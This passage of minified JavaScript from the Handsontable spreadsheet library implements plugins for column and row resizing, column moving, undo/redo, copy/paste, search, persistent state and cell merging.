th");e.rootElement.off("mousedown.manualColumnMove."+e.guid,".manualColumnMover");l.off("mousemove.manualColumnMove."+e.guid);l.off("mouseup.manualColumnMove."+e.guid)};var w=function(e,t){if(e.length<t){for(var n=e.length;n<t;n++){e[n]=n}}};this.beforeInit=function(){this.manualColumnPositions=[]};this.init=function(e){var t=this;var n=!!this.getSettings().manualColumnMove;if(n){var r=this.getSettings().manualColumnMove;var i=h.call(t);if(typeof i!="undefined"){this.manualColumnPositions=i}else if(r instanceof Array){this.manualColumnPositions=r}else{this.manualColumnPositions=[]}if(e=="afterInit"){y.call(this);if(this.manualColumnPositions.length>0){this.forceFullRender=true;this.render()}}}else{b.call(this);this.manualColumnPositions=[]}};this.modifyCol=function(e){if(this.getSettings().manualColumnMove){if(typeof this.manualColumnPositions[e]==="undefined"){w(this.manualColumnPositions,e+1)}return this.manualColumnPositions[e]}return e}}var n=new t;e.hooks.add("beforeInit",n.beforeInit);e.hooks.add("afterInit",function(){n.init.call(this,"afterInit")});e.hooks.add("afterUpdateSettings",function(){n.init.call(this,"afterUpdateSettings")});e.hooks.add("modifyCol",n.modifyCol);e.hooks.register("afterColumnMove")})(Handsontable);(function(e){function t(){function d(e){i=this;t=e;var r=this.view.wt.wtTable.getCoords(e).col;if(r>=0){n=r;var s=t.getBoundingClientRect();a=s.left-6;u=parseInt(s.width,10);f.style.top=s.top+"px";f.style.left=a+u+"px";i.rootElement[0].appendChild(f)}}function v(){f.style.left=a+r+"px"}function m(){var t=this;e.Dom.addClass(f,"active");e.Dom.addClass(l,"active");l.style.top=f.style.top;l.style.left=f.style.left;l.style.height=t.view.maximumVisibleElementHeight(0)+"px";t.rootElement[0].appendChild(l)}function g(){l.style.left=f.style.left}function y(){e.Dom.removeClass(f,"active");e.Dom.removeClass(l,"active")}var t,n,r,i,s,o,u,a,f=document.createElement("DIV"),l=document.createElement("DIV"),c=$(window);f.className="manualColumnResizer";l.className="manualColumnResizerGuide";var h=function(){var t=this;e.hooks.run(t,"persistentStateSave","manualColumnWidths",t.manualColumnWidths)};var p=function(){var t=this;var n={};e.hooks.run(t,"persistentStateLoad","manualColumnWidths",n);return n.value};var b=function(){var i=this;var a;var f=0;var l=null;i.rootElement.on("mouseenter.manualColumnResize."+i.guid,"table thead tr > th",function(e){if(!a){d.call(i,e.currentTarget)}});i.rootElement.on("mousedown.manualColumnResize."+i.guid,".manualColumnResizer",function(t){m.call(i);a=i;if(l==null){l=setTimeout(function(){if(f>=2){s=i.determineColumnWidth.call(i,n);E(n,s);i.forceFullRender=true;i.view.render();e.hooks.run(i,"afterColumnResize",n,s)}f=0;l=null},500);i._registerTimeout(l)}f++;o=t.pageX;s=u});c.on("mousemove.manualColumnResize."+i.guid,function(e){if(a){r=u+(e.pageX-o);s=E(n,r);v();g()}});c.on("mouseup.manualColumnResize."+i.guid,function(){if(a){y();a=false;if(s!=u){i.forceFullRender=true;i.view.render();h.call(i);e.hooks.run(i,"afterColumnResize",n,s)}d.call(i,t)}});i.addHook("afterDestroy",w)};var w=function(){var e=this;e.rootElement.off("mouseenter.manualColumnResize."+e.guid,"table thead tr > th");e.rootElement.off("mousedown.manualColumnResize."+e.guid,".manualColumnResizer");c.off("mousemove.manualColumnResize."+e.guid);c.off("mouseup.manualColumnResize."+e.guid)};this.beforeInit=function(){this.manualColumnWidths=[]};this.init=function(e){var t=this;var n=!!this.getSettings().manualColumnResize;if(n){var r=this.getSettings().manualColumnResize;var i=p.call(t);if(typeof i!="undefined"){this.manualColumnWidths=i}else if(r instanceof Array){this.manualColumnWidths=r}else{this.manualColumnWidths=[]}if(e=="afterInit"){b.call(this);if(this.manualColumnWidths.length>0){this.forceFullRender=true;this.render()}}}else{w.call(this);this.manualColumnWidths=[]}};var E=function(t,n){n=Math.max(n,20);t=e.hooks.execute(i,"modifyCol",t);i.manualColumnWidths[t]=n;return n};this.modifyColWidth=function(e,t){t=this.runHooksAndReturn("modifyCol",t);if(this.getSettings().manualColumnResize&&this.manualColumnWidths[t]){return this.manualColumnWidths[t]}return e}}var n=new t;e.hooks.add("beforeInit",n.beforeInit);e.hooks.add("afterInit",function(){n.init.call(this,"afterInit")});e.hooks.add("afterUpdateSettings",function(){n.init.call(this,"afterUpdateSettings")});e.hooks.add("modifyColWidth",n.modifyColWidth);e.hooks.register("afterColumnResize")})(Handsontable);(function(e){function t(){function d(e){i=this;t=e;var r=this.view.wt.wtTable.getCoords(e).row;if(r>=0){n=r;var s=t.getBoundingClientRect();a=s.top-6;u=parseInt(s.height,10);f.style.left=s.left+"px";f.style.top=a+u+"px";i.rootElement[0].appendChild(f)}}function v(){f.style.top=a+r+"px"}function m(){var t=this;e.Dom.addClass(f,"active");e.Dom.addClass(l,"active");l.style.top=f.style.top;l.style.left=f.style.left;l.style.width=t.view.maximumVisibleElementWidth(0)+"px";t.rootElement[0].appendChild(l)}function g(){l.style.top=f.style.top}function y(){e.Dom.removeClass(f,"active");e.Dom.removeClass(l,"active")}var t,n,r,i,s,o,u,a,f=document.createElement("DIV"),l=document.createElement("DIV"),c=$(window);f.className="manualRowResizer";l.className="manualRowResizerGuide";var h=function(){var t=this;e.hooks.run(t,"persistentStateSave","manualRowHeights",t.manualRowHeights)};var p=function(){var t=this,n={};e.hooks.run(t,"persistentStateLoad","manualRowHeights",n);return n.value};var b=function(){var i=this;var a;var f=0;var l=null;i.rootElement.on("mouseenter.manualRowResize."+i.guid,"table tbody tr > th",function(e){if(!a){d.call(i,e.currentTarget)}});i.rootElement.on("mousedown.manualRowResize."+i.guid,".manualRowResizer",function(t){m.call(i);a=i;if(l==null){l=setTimeout(function(){if(f>=2){E(n,null);i.forceFullRender=true;i.view.render();e.hooks.run(i,"afterRowResize",n,s)}f=0;l=null},500);i._registerTimeout(l)}f++;o=t.pageY;s=u});c.on("mousemove.manualRowResize."+i.guid,function(e){if(a){r=u+(e.pageY-o);s=E(n,r);v();g()}});c.on("mouseup.manualRowResize."+i.guid,function(){if(a){y();a=false;if(s!=u){i.forceFullRender=true;i.view.render();h.call(i);e.hooks.run(i,"afterRowResize",n,s)}d.call(i,t)}});i.addHook("afterDestroy",w)};var w=function(){var e=this;e.rootElement.off("mouseenter.manualRowResize."+e.guid,"table tbody tr > th");e.rootElement.off("mousedown.manualRowResize."+e.guid,".manualRowResizer");c.off("mousemove.manualRowResize."+e.guid);c.off("mouseup.manualRowResize."+e.guid)};this.beforeInit=function(){this.manualRowHeights=[]};this.init=function(e){var t=this;var n=!!this.getSettings().manualRowResize;if(n){var r=this.getSettings().manualRowResize;var i=p.call(t);if(typeof i!="undefined"){this.manualRowHeights=i}else if(r instanceof Array){this.manualRowHeights=r}else{this.manualRowHeights=[]}if(e==="afterInit"){b.call(this);if(this.manualRowHeights.length>0){this.forceFullRender=true;this.render()}}else{this.forceFullRender=true;this.render()}}else{w.call(this);this.manualRowHeights=[]}};var E=function(t,n){t=e.hooks.execute(i,"modifyRow",t);i.manualRowHeights[t]=n;return n};this.modifyRowHeight=function(e,t){if(this.getSettings().manualRowResize){t=this.runHooksAndReturn("modifyRow",t);if(this.manualRowHeights[t]!==void 0){return this.manualRowHeights[t]}}return e}}var n=new t;e.hooks.add("beforeInit",n.beforeInit);e.hooks.add("afterInit",function(){n.init.call(this,"afterInit")});e.hooks.add("afterUpdateSettings",function(){n.init.call(this,"afterUpdateSettings")});e.hooks.add("modifyRowHeight",n.modifyRowHeight);e.hooks.register("afterRowResize")})(Handsontable);(function(){function t(){var e=this;var t=e.getSettings().observeChanges;if(t){if(e.observer){i.call(e)}n.call(e);o.call(e)}else if(!t){i.call(e)}}function n(){var e=this;e.observeChangesActive=true;e.pauseObservingChanges=function(){e.observeChangesActive=false};e.resumeObservingChanges=function(){e.observeChangesActive=true};e.observedData=e.getData();e.observer=jsonpatch.observe(e.observedData,function(t){if(e.observeChangesActive){r.call(e,t);e.render()}e.runHooks("afterChangesObserved")})}function r(e){function u(e){var t;t=f(e);t=a(t);return t}function a(e){var t=[];return e.filter(function(e){var n=l(e.path);if(["add","remove"].indexOf(e.op)!=-1&&!isNaN(n.col)){if(t.indexOf(n.col)!=-1){return false}else{t.push(n.col)}}return true})}function f(e){return e.filter(function(e){return!/[/]length/ig.test(e.path)})}function l(e){var t=e.match(/^\/(\d+)\/?(.*)?$/);return{row:parseInt(t[1],10),col:/^\d*$/.test(t[2])?parseInt(t[2],10):t[2]}}var t=this;var n=u(e);for(var r=0,i=n.length;r<i;r++){var s=n[r];var o=l(s.path);switch(s.op){case"add":if(isNaN(o.col)){t.runHooks("afterCreateRow",o.row)}else{t.runHooks("afterCreateCol",o.col)}break;case"remove":if(isNaN(o.col)){t.runHooks("afterRemoveRow",o.row,1)}else{t.runHooks("afterRemoveCol",o.col,1)}break;case"replace":t.runHooks("afterChange",[o.row,o.col,null,s.value],"external");break}}}function i(){var e=this;if(e.observer){s.call(e);u.call(e)}}function s(){var e=this;jsonpatch.unobserve(e.observedData,e.observer);delete e.observeChangesActive;delete e.pauseObservingChanges;delete e.resumeObservingChanges}function o(){var e=this;e.addHook("afterDestroy",i);e.addHook("afterCreateRow",a);e.addHook("afterRemoveRow",a);e.addHook("afterCreateCol",a);e.addHook("afterRemoveCol",a);e.addHook("afterChange",function(e,t){if(t!="loadData"){a.call(this)}})}function u(){var e=this;e.removeHook("afterDestroy",i);e.removeHook("afterCreateRow",a);e.removeHook("afterRemoveRow",a);e.removeHook("afterCreateCol",a);e.removeHook("afterRemoveCol",a);e.removeHook("afterChange",a)}function a(){var e=this;e.pauseObservingChanges();e.addHookOnce("afterChangesObserved",function(){e.resumeObservingChanges()})}Handsontable.hooks.add("afterLoadData",t);Handsontable.hooks.add("afterUpdateSettings",t);Handsontable.hooks.register("afterChangesObserved")})();(function(e){function t(){function i(){var e=this;for(var t in n){if(n.hasOwnProperty(t)){e.addHook(t,n[t])}}}function s(){var e=this;for(var t in n){if(n.hasOwnProperty(t)){e.removeHook(t,n[t])}}}var t=this;this.init=function(){var n=this,r=n.getSettings()["persistentState"];t.enabled=!!r;if(!t.enabled){s.call(n);return}if(!n.storage){n.storage=new e(n.rootElement[0].id)}n.resetState=t.resetValue;i.call(n)};this.saveValue=function(e,t){var n=this;n.storage.saveValue(e,t)};this.loadValue=function(e,t){var n=this;t.value=n.storage.loadValue(e)};this.resetValue=function(e){var t=this;if(typeof e!="undefined"){t.storage.reset(e)}else{t.storage.resetAll()}};var n={persistentStateSave:t.saveValue,persistentStateLoad:t.loadValue,persistentStateReset:t.resetValue};for(var r in n){if(n.hasOwnProperty(r)){Handsontable.hooks.register(r)}}}var n=new t;Handsontable.hooks.add("beforeInit",n.init);Handsontable.hooks.add("afterUpdateSettings",n.init)})(Storage);(function(e){e.UndoRedo=function(t){var n=this;this.instance=t;this.doneActions=[];this.undoneActions=[];this.ignoreNewActions=false;t.addHook("afterChange",function(t,r){if(t){var i=new e.UndoRedo.ChangeAction(t);n.done(i)}});t.addHook("afterCreateRow",function(t,r,i){if(i){return}var s=new e.UndoRedo.CreateRowAction(t,r);n.done(s)});t.addHook("beforeRemoveRow",function(t,r){var i=n.instance.getData();t=(i.length+t)%i.length;var s=i.slice(t,t+r);var o=new e.UndoRedo.RemoveRowAction(t,s);n.done(o)});t.addHook("afterCreateCol",function(t,r,i){if(i){return}var s=new e.UndoRedo.CreateColumnAction(t,r);n.done(s)});t.addHook("beforeRemoveCol",function(r,i){var s=n.instance.getData();r=(n.instance.countCols()+r)%n.instance.countCols();var o=[];for(var u=0,a=s.length;u<a;u++){o[u]=s[u].slice(r,r+i)}var f;if(e.helper.isArray(t.getSettings().colHeaders)){f=t.getSettings().colHeaders.slice(r,r+o.length)}var l=new e.UndoRedo.RemoveColumnAction(r,o,f);n.done(l)})};e.UndoRedo.prototype.done=function(e){if(!this.ignoreNewActions){this.doneActions.push(e);this.undoneActions.length=0}};e.UndoRedo.prototype.undo=function(){if(this.isUndoAvailable()){var e=this.doneActions.pop();this.ignoreNewActions=true;var t=this;e.undo(this.instance,function(){t.ignoreNewActions=false;t.undoneActions.push(e)})}};e.UndoRedo.prototype.redo=function(){if(this.isRedoAvailable()){var e=this.undoneActions.pop();this.ignoreNewActions=true;var t=this;e.redo(this.instance,function(){t.ignoreNewActions=false;t.doneActions.push(e)})}};e.UndoRedo.prototype.isUndoAvailable=function(){return this.doneActions.length>0};e.UndoRedo.prototype.isRedoAvailable=function(){return this.undoneActions.length>0};e.UndoRedo.prototype.clear=function(){this.doneActions.length=0;this.undoneActions.length=0};e.UndoRedo.Action=function(){};e.UndoRedo.Action.prototype.undo=function(){};e.UndoRedo.Action.prototype.redo=function(){};e.UndoRedo.ChangeAction=function(e){this.changes=e};e.helper.inherit(e.UndoRedo.ChangeAction,e.UndoRedo.Action);e.UndoRedo.ChangeAction.prototype.undo=function(e,t){var n=$.extend(true,[],this.changes),r=e.countEmptyRows(true),i=e.countEmptyCols(true);for(var s=0,o=n.length;s<o;s++){n[s].splice(3,1)}e.addHookOnce("afterChange",t);e.setDataAtRowProp(n,null,null,"undo");for(var s=0,o=n.length;s<o;s++){if(e.getSettings().minSpareRows&&n[s][0]+1+e.getSettings().minSpareRows===e.countRows()&&r==e.getSettings().minSpareRows){e.alter("remove_row",parseInt(n[s][0]+1,10),e.getSettings().minSpareRows);e.undoRedo.doneActions.pop()}if(e.getSettings().minSpareCols&&n[s][1]+1+e.getSettings().minSpareCols===e.countCols()&&i==e.getSettings().minSpareCols){e.alter("remove_col",parseInt(n[s][1]+1,10),e.getSettings().minSpareCols);e.undoRedo.doneActions.pop()}}};e.UndoRedo.ChangeAction.prototype.redo=function(e,t){var n=$.extend(true,[],this.changes);for(var r=0,i=n.length;r<i;r++){n[r].splice(2,1)}e.addHookOnce("afterChange",t);e.setDataAtRowProp(n,null,null,"redo")};e.UndoRedo.CreateRowAction=function(e,t){this.index=e;this.amount=t};e.helper.inherit(e.UndoRedo.CreateRowAction,e.UndoRedo.Action);e.UndoRedo.CreateRowAction.prototype.undo=function(e,t){e.addHookOnce("afterRemoveRow",t);e.alter("remove_row",this.index,this.amount)};e.UndoRedo.CreateRowAction.prototype.redo=function(e,t){e.addHookOnce("afterCreateRow",t);e.alter("insert_row",this.index+1,this.amount)};e.UndoRedo.RemoveRowAction=function(e,t){this.index=e;this.data=t};e.helper.inherit(e.UndoRedo.RemoveRowAction,e.UndoRedo.Action);e.UndoRedo.RemoveRowAction.prototype.undo=function(e,t){var n=[this.index,0];Array.prototype.push.apply(n,this.data);Array.prototype.splice.apply(e.getData(),n);e.addHookOnce("afterRender",t);e.render()};e.UndoRedo.RemoveRowAction.prototype.redo=function(e,t){e.addHookOnce("afterRemoveRow",t);e.alter("remove_row",this.index,this.data.length)};e.UndoRedo.CreateColumnAction=function(e,t){this.index=e;this.amount=t};e.helper.inherit(e.UndoRedo.CreateColumnAction,e.UndoRedo.Action);e.UndoRedo.CreateColumnAction.prototype.undo=function(e,t){e.addHookOnce("afterRemoveCol",t);e.alter("remove_col",this.index,this.amount)};e.UndoRedo.CreateColumnAction.prototype.redo=function(e,t){e.addHookOnce("afterCreateCol",t);e.alter("insert_col",this.index+1,this.amount)};e.UndoRedo.RemoveColumnAction=function(e,t,n){this.index=e;this.data=t;this.amount=this.data[0].length;this.headers=n};e.helper.inherit(e.UndoRedo.RemoveColumnAction,e.UndoRedo.Action);e.UndoRedo.RemoveColumnAction.prototype.undo=function(e,t){var n,r;for(var i=0,s=e.getData().length;i<s;i++){n=e.getSourceDataAtRow(i);r=[this.index,0];Array.prototype.push.apply(r,this.data[i]);Array.prototype.splice.apply(n,r)}if(typeof this.headers!="undefined"){r=[this.index,0];Array.prototype.push.apply(r,this.headers);Array.prototype.splice.apply(e.getSettings().colHeaders,r)}e.addHookOnce("afterRender",t);e.render()};e.UndoRedo.RemoveColumnAction.prototype.redo=function(e,t){e.addHookOnce("afterRemoveCol",t);e.alter("remove_col",this.index,this.amount)}})(Handsontable);(function(e){function t(){var t=this;var o=typeof t.getSettings().undo=="undefined"||t.getSettings().undo;if(o){if(!t.undoRedo){t.undoRedo=new e.UndoRedo(t);i(t);t.addHook("beforeKeyDown",n);t.addHook("afterChange",r)}}else{if(t.undoRedo){delete t.undoRedo;s(t);t.removeHook("beforeKeyDown",n);t.removeHook("afterChange",r)}}}function n(e){var t=this;var n=(e.ctrlKey||e.metaKey)&&!e.altKey;if(n){if(e.keyCode===89||e.shiftKey&&e.keyCode===90){t.undoRedo.redo();e.stopImmediatePropagation()}else if(e.keyCode===90){t.undoRedo.undo();e.stopImmediatePropagation()}}}function r(e,t){var n=this;if(t=="loadData"){return n.undoRedo.clear()}}function i(e){e.undo=function(){return e.undoRedo.undo()};e.redo=function(){return e.undoRedo.redo()};e.isUndoAvailable=function(){return e.undoRedo.isUndoAvailable()};e.isRedoAvailable=function(){return e.undoRedo.isRedoAvailable()};e.clearUndo=function(){return e.undoRedo.clear()}}function s(e){delete e.undo;delete e.redo;delete e.isUndoAvailable;delete e.isRedoAvailable;delete e.clearUndo}e.hooks.add("afterInit",t);e.hooks.add("afterUpdateSettings",t)})(Handsontable);DragToScroll.prototype.setBoundaries=function(e){this.boundaries=e};DragToScroll.prototype.setCallback=function(e){this.callback=e};DragToScroll.prototype.check=function(e,t){var n=0;var r=0;if(t<this.boundaries.top){r=t-this.boundaries.top}else if(t>this.boundaries.bottom){r=t-this.boundaries.bottom}if(e<this.boundaries.left){n=e-this.boundaries.left}else if(e>this.boundaries.right){n=e-this.boundaries.right}this.callback(n,r)};var dragToScroll;var instance;if(typeof Handsontable!=="undefined"){var setupListening=function(e){e.dragToScrollListening=false;var t=e.view.wt.wtScrollbars.vertical.scrollHandler;dragToScroll=new DragToScroll;if(t===window){return}else if(t){dragToScroll.setBoundaries(t.getBoundingClientRect())}else{dragToScroll.setBoundaries(e.$table[0].getBoundingClientRect())}dragToScroll.setCallback(function(n,r){if(n<0){if(t){t.scrollLeft-=50}else{e.view.wt.scrollHorizontal(-1).draw()}}else if(n>0){if(t){t.scrollLeft+=50}else{e.view.wt.scrollHorizontal(1).draw()}}if(r<0){if(t){t.scrollTop-=20}else{e.view.wt.scrollVertical(-1).draw()}}else if(r>0){if(t){t.scrollTop+=20}else{e.view.wt.scrollVertical(1).draw()}}});e.dragToScrollListening=true};Handsontable.hooks.add("afterInit",function(){var e=this;$(document).on("mouseup."+this.guid,function(){e.dragToScrollListening=false});$(document).on("mousemove."+this.guid,function(t){if(e.dragToScrollListening){dragToScroll.check(t.clientX,t.clientY)}})});Handsontable.hooks.add("afterDestroy",function(){$(document).off("."+this.guid)});Handsontable.hooks.add("afterOnCellMouseDown",function(){setupListening(this)});Handsontable.hooks.add("afterOnCellCornerMouseDown",function(){setupListening(this)});Handsontable.plugins.DragToScroll=DragToScroll}(function(e,t,n){function r(r){function s(){if(!r.isListening()){return}r.selection.empty()}function o(e){if(!r.isListening()||!r.selection.isSelected()){return}var t=e.replace(/^[\r\n]*/g,"").replace(/[\r\n]*$/g,""),i=n.parse(t),s=r.getSelected(),o=new WalkontableCellCoords(s[0],s[1]),u=new WalkontableCellCoords(s[2],s[3]),a=new WalkontableCellRange(o,o,u),f=a.getTopLeftCorner(),l=a.getBottomRightCorner(),c=f,h=new WalkontableCellCoords(Math.max(l.row,i.length-1+f.row),Math.max(l.col,i[0].length-1+f.col));r.addHookOnce("afterChange",function(e,t){if(e&&e.length){this.selectCell(c.row,c.col,h.row,h.col)}});r.populateFromArray(c.row,c.col,i,h.row,h.col,"paste",r.getSettings().pasteMode)}function u(t){if(r.getSelected()){if(e.helper.isCtrlKey(t.keyCode)){i.setCopyableText();t.stopImmediatePropagation();return}var n=(t.ctrlKey||t.metaKey)&&!t.altKey;if(t.keyCode==e.helper.keyCode.A&&n){r._registerTimeout(setTimeout(e.helper.proxy(i.setCopyableText,i),0))}}}this.copyPasteInstance=t.getInstance();this.copyPasteInstance.onCut(s);this.copyPasteInstance.onPaste(o);var i=this;r.addHook("beforeKeyDown",u);this.destroy=function(){this.copyPasteInstance.removeCallback(s);this.copyPasteInstance.removeCallback(o);this.copyPasteInstance.destroy();r.removeHook("beforeKeyDown",u)};r.addHook("afterDestroy",e.helper.proxy(this.destroy,this));this.triggerPaste=e.helper.proxy(this.copyPasteInstance.triggerPaste,this.copyPasteInstance);this.triggerCut=e.helper.proxy(this.copyPasteInstance.triggerCut,this.copyPasteInstance);this.setCopyableText=function(){var t=r.getSettings();var n=t.copyRowsLimit;var i=t.copyColsLimit;var s=r.getSelectedRange();var o=s.getTopLeftCorner();var u=s.getBottomRightCorner();var a=o.row;var f=o.col;var l=u.row;var c=u.col;var h=Math.min(l,a+n-1);var p=Math.min(c,f+i-1);r.copyPaste.copyPasteInstance.copyable(r.getCopyableData(a,f,h,p));if(l!==h||c!==p){e.hooks.run(r,"afterCopyLimit",l-a+1,c-f+1,n,i)}}}function i(){var e=this;var t=e.getSettings().copyPaste!==false;if(t&&!e.copyPaste){e.copyPaste=new r(e)}else if(!t&&e.copyPaste){e.copyPaste.destroy();delete e.copyPaste}}e.hooks.add("afterInit",i);e.hooks.add("afterUpdateSettings",i);e.hooks.register("afterCopyLimit")})(Handsontable,CopyPaste,SheetClip);(function(e){"use strict";function n(){var t=this;var n=!!t.getSettings().search;if(n){t.search=new e.Search(t)}else{delete t.search}}e.Search=function(n){this.query=function(t,r,i){var s=n.countRows();var o=n.countCols();var u=[];if(!r){r=e.Search.global.getDefaultCallback()}if(!i){i=e.Search.global.getDefaultQueryMethod()}for(var a=0;a<s;a++){for(var f=0;f<o;f++){var l=n.getDataAtCell(a,f);var c=n.getCellMeta(a,f);var h=c.search.callback||r;var p=c.search.queryMethod||i;var d=p(t,l);if(d){var v={row:a,col:f,data:l};u.push(v)}if(h){h(n,a,f,l,d)}}}return u}};e.Search.DEFAULT_CALLBACK=function(e,t,n,r,i){e.getCellMeta(t,n).isSearchResult=i};e.Search.DEFAULT_QUERY_METHOD=function(e,t){if(typeof e=="undefined"||e==null||!e.toLowerCase||e.length==0){return false}if(typeof t=="undefined"||t==null){return false}return t.toString().toLowerCase().indexOf(e.toLowerCase())!=-1};e.Search.DEFAULT_SEARCH_RESULT_CLASS="htSearchResult";e.Search.global=function(){var t=e.Search.DEFAULT_CALLBACK;var n=e.Search.DEFAULT_QUERY_METHOD;var r=e.Search.DEFAULT_SEARCH_RESULT_CLASS;return{getDefaultCallback:function(){return t},setDefaultCallback:function(e){t=e},getDefaultQueryMethod:function(){return n},setDefaultQueryMethod:function(e){n=e},getDefaultSearchResultClass:function(){return r},setDefaultSearchResultClass:function(e){r=e}}}();e.SearchCellDecorator=function(t,n,r,i,s,o,u){var a=typeof u.search=="object"&&u.search.searchResultClass||e.Search.global.getDefaultSearchResultClass();if(u.isSearchResult){e.Dom.addClass(n,a)}else{e.Dom.removeClass(n,a)}};var t=e.renderers.cellDecorator;e.renderers.cellDecorator=function(n,r,i,s,o,u,a){t.apply(this,arguments);e.SearchCellDecorator.apply(this,arguments)};e.hooks.add("afterInit",n);e.hooks.add("afterUpdateSettings",n)})(Handsontable);MergeCells.prototype.canMergeRange=function(e){return!e.isSingle()};MergeCells.prototype.mergeRange=function(e){if(!this.canMergeRange(e)){return}var t=e.getTopLeftCorner();var n=e.getBottomRightCorner();var r={};r.row=t.row;r.col=t.col;r.rowspan=n.row-t.row+1;r.colspan=n.col-t.col+1;this.mergedCellInfoCollection.setInfo(r)};MergeCells.prototype.mergeOrUnmergeSelection=function(e){var t=this.mergedCellInfoCollection.getInfo(e.from.row,e.from.col);if(t){this.unmergeSelection(e.from)}else{this.mergeSelection(e)}};MergeCells.prototype.mergeSelection=function(e){this.mergeRange(e)};MergeCells.prototype.unmergeSelection=function(e){var t=this.mergedCellInfoCollection.getInfo(e.row,e.col);this.mergedCellInfoCollection.removeInfo(t.row,t.col)};MergeCells.prototype.applySpanProperties=function(e,t,n){var r=this.mergedCellInfoCollection.getInfo(t,n);if(r){if(r.row===t&&r.col===n){e.setAttribute("rowspan",r.rowspan);e.setAttribute("colspan",r.colspan)}else{e.style.display="none"}}else{e.removeAttribute("rowspan");e.removeAttribute("colspan")}};MergeCells.prototype.modifyTransform=function(e,t,n){var r=function(e,t){if(t.row>=e.row&&t.row<=e.row+e.rowspan-1){return true}return false},i=function(e,t){if(t.col>=e.col&&t.col<=e.col+e.colspan-1){return true}return false},s=function(e){return new WalkontableCellCoords(t.to.row+e.row,t.to.col+e.col)};var o={row:n.row,col:n.col};if(e=="modifyTransformStart"){if(!this.lastDesiredCoords){this.lastDesiredCoords=new WalkontableCellCoords(null,null)}var u=new WalkontableCellCoords(t.highlight.row,t.highlight.col),a=this.mergedCellInfoCollection.getInfo(u.row,u.col),f;for(var l=0,c=this.mergedCellInfoCollection.length;l<c;l++){var h=this.mergedCellInfoCollection[l];h=new WalkontableCellCoords(h.row+h.rowspan-1,h.col+h.colspan-1);if(t.includes(h)){f=true;break}}if(a){var p=new WalkontableCellCoords(a.row,a.col),d=new WalkontableCellCoords(a.row+a.rowspan-1,a.col+a.colspan-1),v=new WalkontableCellRange(p,p,d);if(!v.includes(this.lastDesiredCoords)){this.lastDesiredCoords=new WalkontableCellCoords(null,null)}o.row=this.lastDesiredCoords.row?this.lastDesiredCoords.row-u.row:o.row;o.col=this.lastDesiredCoords.col?this.lastDesiredCoords.col-u.col:o.col;if(n.row>0){o.row=a.row+a.rowspan-1-u.row+n.row}else if(n.row<0){o.row=u.row-a.row+n.row}if(n.col>0){o.col=a.col+a.colspan-1-u.col+n.col}else if(n.col<0){o.col=u.col-a.col+n.col}}var m=new WalkontableCellCoords(t.highlight.row+o.row,t.highlight.col+o.col),g=this.mergedCellInfoCollection.getInfo(m.row,m.col);if(g){this.lastDesiredCoords=m;o={row:g.row-u.row,col:g.col-u.col}}}else if(e=="modifyTransformEnd"){for(var l=0,c=this.mergedCellInfoCollection.length;l<c;l++){var y=this.mergedCellInfoCollection[l],p=new WalkontableCellCoords(y.row,y.col),d=new WalkontableCellCoords(y.row+y.rowspan-1,y.col+y.colspan-1),b=new WalkontableCellRange(p,p,d),w=t.getBordersSharedWith(b);if(b.isEqual(t)){t.setDirection("NW-SE")}else if(w.length>0){var E=t.highlight.isEqual(b.from);if(w.indexOf("top")>-1){if(t.to.isSouthEastOf(b.from)&&E){t.setDirection("NW-SE")}else if(t.to.isSouthWestOf(b.from)&&E){t.setDirection("NE-SW")}}else if(w.indexOf("bottom")>-1){if(t.to.isNorthEastOf(b.from)&&E){t.setDirection("SW-NE")}else if(t.to.isNorthWestOf(b.from)&&E){t.setDirection("SE-NW")}}}var m=s(o),S=r(y,m),x=i(y,m);if(t.includesRange(b)&&(b.includes(m)||S||x)){if(S){if(o.row<0){o.row-=y.rowspan-1}else if(o.row>0){o.row+=y.rowspan-1}}if(x){if(o.col<0){o.col-=y.colspan-1}else if(o.col>0){o.col+=y.colspan-1}}}}}if(o.row!=0)n.row=o.row;if(o.col!=0)n.col=o.col};if(typeof Handsontable=="undefined"){throw new Error("Handsontable is not defined")}var beforeInit=function(){var e=this;var t=e.getSettings().mergeCells;if(t){if(!e.mergeCells){e.mergeCells=new MergeCells(t)}}};var afterInit=function(){var e=this;if(e.mergeCells){e.view.wt.wtTable.getCell=function(t){if(e.getSettings().mergeCells){var n=e.mergeCells.mergedCellInfoCollection.getInfo(t.row,t.col);if(n){t=n}}return WalkontableTable.prototype.getCell.call(this,t)}}};var onBeforeKeyDown=function(e){if(!this.mergeCells){return}var t=(e.ctrlKey||e.metaKey)&&!e.altKey;if(t){if(e.keyCode===77){this.mergeCells.mergeOrUnmergeSelection(this.getSelectedRange());this.render();e.stopImmediatePropagation()}}};var addMergeActionsToContextMenu=function(e){if(!this.getSettings().mergeCells){return}e.items.push(Handsontable.ContextMenu.SEPARATOR);e.items.push({key:"mergeCells",name:function(){var e=this.getSelected();var t=this.mergeCells.mergedCellInfoCollection.getInfo(e[0],e[1]);if(t){return"Unmerge cells"}else{return"Merge cells"}},callback:function(){this.mergeCells.mergeOrUnmergeSelection(this.getSelectedRange());this.render()},disabled:function(){return false}})};var afterRenderer=function(e,t,n,r,i,s){if(this.mergeCells){this.mergeCells.applySpanProperties(e,t,n)}};var modifyTransformFactory=function(e){return function(t){var n=this.getSettings().mergeCells;if(n){var r=this.getSelectedRange();this.mergeCells.modifyTransform(e,r,t);if(e==="modifyTransformEnd"){var i=this.countRows();var s=this.countCols();if(r.from.row<0){r.from.row=0}else if(r.from.row>0&&r.from.row>=i){r.from.row=r.from-1}if(r.from.col<0){r.from.col=0}else if(r.from.col>0&&r.from.col>=s){r.from.col=s-1}}}}};var beforeSetRangeEnd=function(e){this.lastDesiredCoords=null;var t=this.getSettings().mergeCells;if(t){var n=this.getSelectedRange();n.highlight=new WalkontableCellCoords(n.highlight.row,n.highlight.col);n.to=e;var r=false;do{r=false;for(var i=0,s=this.mergeCells.mergedCellInfoCollection.length;i<s;i++){var o=this.mergeCells.mergedCellInfoCollection[i];var u=new WalkontableCellCoords(o.row,o.col);var a=new WalkontableCellCoords(o.row+o.rowspan-1,o.col+o.colspan-1);var f=new WalkontableCellRange(u,u,a);if(n.expandByRange(f)){e.row=n.to.row;e.col=n.to.col;r=true}}}while(r)}};var beforeDrawAreaBorders=function(e,t){if(t&&t=="area"){var n=this.getSettings().mergeCells;if(n){var r=this.getSelectedRange();var i=new WalkontableCellRange(r.from,r.from,r.from);var s=new WalkontableCellRange(r.to,r.to,r.to);for(var o=0,u=this.mergeCells.mergedCellInfoCollection.length;o<u;o++){var a=this.mergeCells.mergedCellInfoCollection[o];var f=new WalkontableCellCoords(a.row,a.col);var l=new WalkontableCellCoords(a.row+a.rowspan-1,a.col+a.colspan-1);var c=new 